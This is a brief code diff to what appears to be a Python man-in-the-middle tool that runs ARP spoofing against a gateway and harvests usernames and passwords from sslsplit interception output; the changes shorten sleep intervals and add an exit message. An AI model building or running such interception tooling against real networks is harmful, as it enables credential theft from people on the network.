@@ -68,7 +68,7 @@ def get_username_and_password():
                 if found:
                     pathname = os.path.join('.', directory, filename)
                     os.rename(pathname, pathname + '.bak')
-            time.sleep(3)
+            time.sleep(1)
             if not os.path.exists('sslsplit.pid'): return
     except KeyboardInterrupt:
         return
@@ -88,13 +88,14 @@ def main():
     while True:
         try:
             arp_spoofing(gateway, device)
-            time.sleep(5)
+            time.sleep(3)
         except KeyboardInterrupt:
             if os.path.exists('sslsplit.pid'):
                 with open('sslsplit.pid') as f:
                     pid = next(f).strip()
                     command = ['kill', '-15', pid]
                     Popen(command, stdout=DEVNULL, stderr=DEVNULL)
+            print("\nDetected CTRL + C pressed and Exiting ...")
             break
 
     thread.join()
